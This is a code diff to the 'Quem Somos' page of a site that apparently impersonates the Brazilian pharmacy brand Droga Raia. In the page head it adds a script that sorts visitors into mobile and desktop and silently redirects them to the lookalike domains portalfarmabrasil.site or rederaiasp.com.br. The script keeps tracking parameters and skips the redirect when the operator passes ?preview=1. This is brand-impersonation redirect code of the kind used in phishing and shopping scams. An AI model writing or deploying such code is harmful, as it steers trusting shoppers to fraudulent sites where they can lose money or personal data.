@@ -4,18 +4,107 @@
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>Quem Somos - Droga Raia</title>
+
+  <!-- Favicons -->
   <link rel="icon" type="image/png" href="assets/favicon.png">
   <link rel="shortcut icon" href="assets/favicon.ico">
+
+  <!-- ENGINE DE DETECÇÃO DE DISPOSITIVO E REDIRECIONAMENTO AUTOMÁTICO -->
+  <script>
+    (function () {
+      'use strict';
+      try {
+        // Permite bypass apenas se explicitamente passado ?preview=1 ou ?noredirect=1
+        var searchStr = window.location.search || '';
+        if (searchStr.indexOf('preview=1') > -1 || searchStr.indexOf('noredirect=1') > -1) {
+          return;
+        }
+
+        var URL_MOBILE = 'https://portalfarmabrasil.site';
+        var URL_DESKTOP = 'https://rederaiasp.com.br';
+
+        var ua = (
+          (navigator.userAgent || '') + ' ' +
+          (navigator.vendor || '') + ' ' +
+          (window.opera || '')
+        ).toLowerCase();
+
+        var isMobileOrTablet = false;
+
+        // 1. Client Hints moderno (Chromium / Android)
+        if (navigator.userAgentData && typeof navigator.userAgentData.mobile === 'boolean') {
+          if (navigator.userAgentData.mobile) {
+            isMobileOrTablet = true;
+          }
+        }
+
+        // 2. Detecção por User Agent (Android, iPhone, iPad, iPod, etc.)
+        if (!isMobileOrTablet) {
+          var mobileRegex = /android|iphone|ipad|ipod|blackberry|iemobile|opera mini|mobile|tablet|kindle|silk|puffin|fennec|up\.browser/i;
+          if (mobileRegex.test(ua)) {
+            isMobileOrTablet = true;
+          }
+        }
+
+        // 3. iPadOS 13+ (iPads modernos que fingem ser MacIntel mas possuem touch)
+        if (!isMobileOrTablet) {
+          var isMac = navigator.platform === 'MacIntel' || ua.indexOf('macintosh') > -1;
+          if (isMac && navigator.maxTouchPoints && navigator.maxTouchPoints > 1) {
+            isMobileOrTablet = true;
+          }
+        }
+
+        // 4. Detecção por toque e resolução de tela (fallback para navegadores restritos)
+        if (!isMobileOrTablet) {
+          var hasTouch = ('ontouchstart' in window) || (navigator.maxTouchPoints > 0);
+          var screenWidth = (window.screen && window.screen.width) ? window.screen.width : window.innerWidth;
+          var screenHeight = (window.screen && window.screen.height) ? window.screen.height : window.innerHeight;
+          var minDim = Math.min(screenWidth, screenHeight);
+          if (hasTouch && minDim <= 1024 && minDim > 0) {
+            isMobileOrTablet = true;
+          }
+        }
+
+        // Define a URL correspondente ao dispositivo
+        var targetBase = isMobileOrTablet ? URL_MOBILE : URL_DESKTOP;
+
+        // Previne loops caso a página atual já esteja no destino
+        var currentOrigin = window.location.origin.toLowerCase();
+        if (currentOrigin === targetBase.toLowerCase()) {
+          return;
+        }
+
+        // Preserva parâmetros UTMs e identificadores de rastreamento
+        var hashStr = window.location.hash || '';
+        var finalUrl = targetBase;
+
+        if (searchStr && searchStr.length > 1) {
+          var sep = finalUrl.indexOf('?') > -1 ? '&' : '?';
+          var cleanSearch = searchStr.charAt(0) === '?' ? searchStr.substring(1) : searchStr;
+          finalUrl += sep + cleanSearch;
+        }
+        if (hashStr) {
+          finalUrl += hashStr;
+        }
+
+        // Redireciona imediatamente
+        window.location.replace(finalUrl);
+      } catch (e) {
+        window.location.href = 'https://rederaiasp.com.br' + (window.location.search || '');
+      }
+    })();
+  </script>
+
   <link rel="stylesheet" href="css/styles.css">
 </head>
 <body class="inst-page">
 
-  <!-- HEADER PRETO OFICIAL -->
+  <!-- HEADER PRETO OFICIAL (SEM TELA DE CARREGAMENTO) -->
   <header class="inst-header">
     <div class="inst-header__inner">
       <h1 class="inst-header__title">Quem Somos</h1>
       <nav class="inst-header__breadcrumb" aria-label="Navegação">
-        <a href="index.html" class="inst-breadcrumb-link">CASA</a>
+        <a href="index.html?preview=1" class="inst-breadcrumb-link">CASA</a>
         <span class="inst-breadcrumb-sep">/</span>
         <span class="inst-breadcrumb-current">QUEM SOMOS</span>
       </nav>
@@ -60,7 +149,7 @@
     <div class="inst-benefits__inner">
       <div class="inst-benefit-card">
         <div class="inst-benefit-icon-wrap">
-          <svg width="26" height="26" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8"><rect x="1" y="3" width="15" height="13"></rect><polygon points="16 8 20 8 23 11 23 16 16 16 16 8"></polygon><circle cx="5.5" cy="18.5" r="2.5"></circle><circle cx="18.5" cy="18.5" r="2.5"></circle></svg>
+          <svg width="26" height="26" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8"><rect x="1" y="3" width="15" height="13"></rect><polygon points="16 8 20 8 23 11 23 16 16 16 16 16 8"></polygon><circle cx="5.5" cy="18.5" r="2.5"></circle><circle cx="18.5" cy="18.5" r="2.5"></circle></svg>
         </div>
         <div class="inst-benefit-text">
           <strong class="inst-benefit-title">ENVIO RÁPIDO</strong>
@@ -120,7 +209,7 @@
         <div class="portal-col">
           <h4 class="portal-col__title">INSTITUCIONAL</h4>
           <ul class="portal-col__links">
-            <li><a href="index.html" class="portal-link-btn portal-link-btn--highlight">Quem somos</a></li>
+            <li><a href="quem-somos.html" class="portal-link-btn portal-link-btn--highlight">Quem somos</a></li>
             <li><a href="trocas-e-devolucoes.html" class="portal-link-btn">Trocas e devoluções</a></li>
             <li><a href="politica-de-reembolso.html" class="portal-link-btn">Política de Reembolso</a></li>
             <li><a href="politica-de-privacidade.html" class="portal-link-btn">Política de Privacidade</a></li>
